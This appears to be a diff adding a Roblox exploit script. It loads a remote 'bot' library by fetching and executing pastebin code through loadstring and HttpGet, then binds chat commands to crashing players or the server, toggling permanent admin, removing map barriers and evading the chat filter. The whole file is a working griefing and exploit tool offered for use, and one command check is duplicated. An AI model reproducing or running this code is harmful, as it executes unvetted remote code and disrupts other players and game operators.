@@ -1,0 +1,79 @@
+local bot = loadstring(game:HttpGet("https://pastebin.com/raw/ADdVs8m3"))()
+
+bot.BotStartup()
+bot.AllowCommands()
+
+
+
+game.Players.LocalPlayer.Chatted:connect(function(msg)
+    if msg == ".1" then 
+game.Players:Chat("music 6823597327")
+    end
+    if msg == ".2" then 
+game.Players:Chat("music 8260658079")
+    end
+    if msg == ".3" then 
+game.Players:Chat("music 8257343038")
+    end
+    if msg == ".3" then 
+game.Players:Chat("music 8187883112")
+    end
+     if msg == ".4" then 
+game.Players:Chat("music 4312711557 ")
+    end
+    if msg == ".5" then 
+game.Players:Chat("music 9043722780")
+    end
+     if msg == "bot.StartUp()"  then 
+        bot.BotStartup()
+        wait(0.01)
+        game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n "..bot.GetStatus())
+     end
+     if msg == "status"  then 
+        game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n "..bot.GetStatus())
+     end
+     if msg == "silc" then 
+         game.Players:Chat("music 2891547790")
+         wait(0.02)
+        bot.PersonSilentCrash()
+     end
+     if msg == "/shutdown" then 
+        bot.NoGamePassSilentCrash()
+     end
+     if msg == "stonemap" then 
+        bot.StoneMap()
+     end
+     if msg == "perm" then 
+        bot.TogglePermAdmin()
+     end
+     if msg == "nok" then 
+        bot.RemoveObbyParts()
+     end
+     if msg == "rj" then 
+        bot.Rejoin()
+     end
+     if msg == "fil" then 
+         bot.FixChatFilter()
+     end
+
+      if msg == "runattach" then 
+         bot.AllowAttaching()
+     end
+     if msg == "rwalls" then 
+         bot.RemoveBarriers()
+     end
+
+     if msg == "cmd" then 
+         bot.AllowCommands()
+     end
+     if msg == "movebp" then 
+         bot.MoveBP()
+     end
+     if msg == "fixbp" then 
+         bot.FixBP()
+     end
+end)
+
+bot.AntiHat()
+
+
